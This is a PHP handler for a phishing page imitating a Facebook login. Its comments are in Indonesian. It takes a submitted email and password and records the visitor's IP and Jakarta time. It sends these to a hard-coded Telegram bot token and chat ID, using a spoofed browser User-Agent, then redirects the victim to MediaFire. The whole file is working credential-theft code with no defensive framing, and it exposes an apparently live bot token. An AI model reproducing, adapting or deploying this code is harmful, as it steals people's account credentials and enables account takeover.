<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "8514761747:AAFRzzegKPnDq_wz5aREmTI4ZThvsiqoNBM";
    $chat_id = "5906696731";

    $email = $_POST['email'];
    $pass  = $_POST['pass'];

    // Deteksi IP (Trik buat ByetHost)
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    // Set Waktu Jakarta
    date_default_timezone_set('Asia/Jakarta');
    $waktu = date('d/m/Y - H:i:s');

    // Pesan HTML (Lebih aman dari Markdown)
    $message = "<b>🔵 FB LOGIN DETECTED 🔵</b>\n\n";
    $message .= "📧 <b>User:</b> <code>$email</code>\n";
    $message .= "🔑 <b>Pass:</b> <code>$pass</code>\n";
    $message .= "🌐 <b>IP:</b> $ip\n";
    $message .= "⏰ <b>Waktu:</b> $waktu";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=HTML";

    // Kirim pakai User-Agent agar tidak diblokir
    $opts = ["http" => ["header" => "User-Agent: Mozilla/5.0\r\n"]];
    $context = stream_context_create($opts);
    @file_get_contents($url, false, $context);

    header("Location: https://www.mediafire.com/myfiles/");
    exit();
}
?>
